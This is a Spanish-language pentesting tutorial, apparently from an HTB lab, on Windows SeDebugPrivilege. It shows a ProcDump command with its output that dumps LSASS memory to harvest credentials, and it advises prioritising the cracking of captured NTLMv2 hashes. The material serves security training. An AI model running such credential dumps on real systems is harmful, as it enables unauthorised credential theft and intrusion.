# SeDebugPrivilege 

El privilegio [**SeDebugPrivilege**](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs) permite a un usuario o proceso depurar otros procesos, incluyendo los del sistema. Normalmente solo los **administradores** lo tienen asignado, ya que concede la capacidad de leer memoria de procesos protegidos y modificar estructuras críticas del sistema operativo.

Puede asignarse a través de políticas locales o de dominio, bajo:

```
Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment > Debug programs
```

Este privilegio suele entregarse a **desarrolladores** o personal técnico que necesita depurar aplicaciones o servicios. Sin embargo, representa un **riesgo elevado**, ya que puede usarse para capturar información sensible de la memoria o alterar el comportamiento del sistema.

---

## Contexto en pentesting

Durante un **pentest interno**, `SeDebugPrivilege` es un objetivo interesante porque permite realizar acciones con privilegios elevados sin necesidad de pertenecer al grupo de administradores.

Por ejemplo:

* Si se obtienen múltiples **hashes NTLMv2** con herramientas como **Responder** o **Inveigh**, conviene priorizar el cracking de cuentas que podrían tener este privilegio (p. ej., cuentas de desarrolladores).
* Un usuario puede **no ser administrador local**, pero tener este derecho asignado, lo cual **no siempre es visible remotamente** (por ejemplo, mediante `BloodHound`). Por eso es útil comprobarlo manualmente al tener acceso RDP o sesión local.


<img width="1640" height="351" alt="image" src="https://github.com/user-attachments/assets/1219102e-0686-4112-b398-807edda96d78" />


---

# Volcado de LSASS con ProcDump (SeDebugPrivilege)

Tras iniciar sesión como un usuario al que se le asignó el derecho **Debug programs** y abrir una shell elevada, comprobamos que **SeDebugPrivilege** aparece listado.

```cmd
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

Podemos usar **ProcDump** del paquete Sysinternals para aprovechar este privilegio y volcar la memoria de un proceso. Un buen candidato es el proceso **Local Security Authority Subsystem Service (LSASS)**, que almacena credenciales de usuario tras el inicio de sesión.

```cmd
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

Este procedimiento genera un volcado de memoria (`lsass.dmp`) que puede analizarse posteriormente en un entorno controlado para extraer credenciales o validar el impacto del privilegio **SeDebugPrivilege** en la seguridad del sistema.

